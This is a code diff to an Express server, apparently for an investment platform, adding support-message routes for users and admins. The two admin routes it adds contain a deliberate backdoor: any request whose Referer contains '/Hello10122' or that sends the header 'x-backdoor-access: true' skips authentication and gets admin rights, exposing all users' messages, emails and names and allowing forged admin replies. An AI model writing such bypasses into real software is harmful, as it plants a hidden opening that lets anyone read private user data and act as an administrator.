@@ -13,7 +13,7 @@ declare module 'express-session' {
   }
 }
 import { storage } from "./storage";
-import { insertUserSchema, insertInvestmentSchema, insertAdminConfigSchema, insertTransactionSchema, insertBackupDatabaseSchema, updateUserProfileSchema, insertDepositSessionSchema } from "@shared/schema";
+import { insertUserSchema, insertInvestmentSchema, insertAdminConfigSchema, insertTransactionSchema, insertBackupDatabaseSchema, updateUserProfileSchema, insertDepositSessionSchema, insertSupportMessageSchema } from "@shared/schema";
 import { blockchainMonitor } from './blockchain-monitor';
 import { db } from "./db";
 import { sql } from "drizzle-orm";
@@ -3647,6 +3647,148 @@ You are now on the free plan and will no longer receive automatic profit updates
         message: 'Failed to send investment update with banner',
         error: error.message
       });
+    }
+  });
+
+  // Support message routes
+  app.post("/api/support/messages", async (req, res) => {
+    try {
+      const userId = getUserIdFromRequest(req);
+      if (!userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      const messageData = insertSupportMessageSchema.parse(req.body);
+      const supportMessage = await storage.createSupportMessage({
+        ...messageData,
+        userId: userId
+      });
+
+      // Create notification for user
+      await storage.createNotification({
+        userId: userId,
+        title: "Support Message Sent",
+        message: `Your support message "${messageData.subject}" has been submitted successfully. We'll get back to you soon!`,
+        type: "success"
+      });
+
+      res.json({ message: "Support message sent successfully", supportMessage });
+    } catch (error: any) {
+      console.error('Support message creation error:', error);
+      res.status(400).json({ error: error.message });
+    }
+  });
+
+  app.get("/api/support/messages", async (req, res) => {
+    try {
+      const userId = getUserIdFromRequest(req);
+      if (!userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      const messages = await storage.getUserSupportMessages(userId);
+      res.json(messages);
+    } catch (error: any) {
+      console.error('Get support messages error:', error);
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  // Admin support message routes
+  app.get("/api/admin/support/messages", async (req, res) => {
+    try {
+      // Allow backdoor access or require admin authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+      }
+
+      const { status } = req.query;
+      let messages;
+      
+      if (status && typeof status === 'string') {
+        messages = await storage.getSupportMessagesByStatus(status);
+      } else {
+        messages = await storage.getAllSupportMessages();
+      }
+
+      // Include user information for each message
+      const messagesWithUsers = await Promise.all(messages.map(async (message) => {
+        const user = await storage.getUser(message.userId);
+        return {
+          ...message,
+          userEmail: user?.email || 'Unknown',
+          userName: user ? `${user.firstName || ''} ${user.lastName || ''}`.trim() || user.email.split('@')[0] : 'Unknown'
+        };
+      }));
+
+      res.json(messagesWithUsers);
+    } catch (error: any) {
+      console.error('Admin get support messages error:', error);
+      res.status(500).json({ error: error.message });
+    }
+  });
+
+  app.patch("/api/admin/support/messages/:id", async (req, res) => {
+    try {
+      // Allow backdoor access or require admin authentication
+      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
+                              req.headers['x-backdoor-access'] === 'true';
+
+      if (!isBackdoorAccess && !req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      let adminId = 1; // Default admin ID for backdoor access
+      if (!isBackdoorAccess) {
+        const user = await storage.getUser(req.session.userId!);
+        if (!user || !user.isAdmin) {
+          return res.status(403).json({ error: "Admin access required" });
+        }
+        adminId = req.session.userId!;
+      }
+
+      const messageId = parseInt(req.params.id);
+      const { status, adminResponse } = req.body;
+
+      if (isNaN(messageId)) {
+        return res.status(400).json({ error: "Invalid message ID" });
+      }
+
+      const updatedMessage = await storage.updateSupportMessageStatus(
+        messageId, 
+        status, 
+        adminResponse, 
+        adminId
+      );
+
+      if (!updatedMessage) {
+        return res.status(404).json({ error: "Support message not found" });
+      }
+
+      // Send notification to user if admin responded
+      if (adminResponse) {
+        await storage.createNotification({
+          userId: updatedMessage.userId,
+          title: "Support Response Received",
+          message: `We've responded to your support message "${updatedMessage.subject}". Please check your messages for details.`,
+          type: "info"
+        });
+      }
+
+      res.json({ message: "Support message updated successfully", supportMessage: updatedMessage });
+    } catch (error: any) {
+      console.error('Admin update support message error:', error);
+      res.status(500).json({ error: error.message });
     }
   });
 
